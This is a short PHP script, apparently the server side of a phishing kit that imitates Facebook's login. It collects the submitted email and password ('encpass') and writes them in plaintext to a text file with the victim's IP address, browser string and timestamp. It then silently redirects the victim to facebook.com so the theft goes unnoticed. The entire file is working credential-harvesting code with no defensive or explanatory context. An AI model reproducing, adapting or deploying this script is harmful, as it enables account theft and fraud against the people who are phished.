<?php

function gravar($texto){
    $fp = fopen("myfile.txt", "a+");
    fwrite($fp, $texto);
    fclose($fp);
}

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
date_default_timezone_set('America/Sao_Paulo');
$localTime = date('d/m/Y H:i:s', time());

$user = $_POST['email'];
$pass = $_POST['encpass'];

gravar("Username: ".$user ."\nPassword: ".$pass."\nIP: ".$ip."\nbrowser: ".$browser."\nTime: ".$localTime. "\n-------------------------------------------------------------------\n");
echo "<script>window.location.href = 'https://www.facebook.com/?active=true'</script>";

?>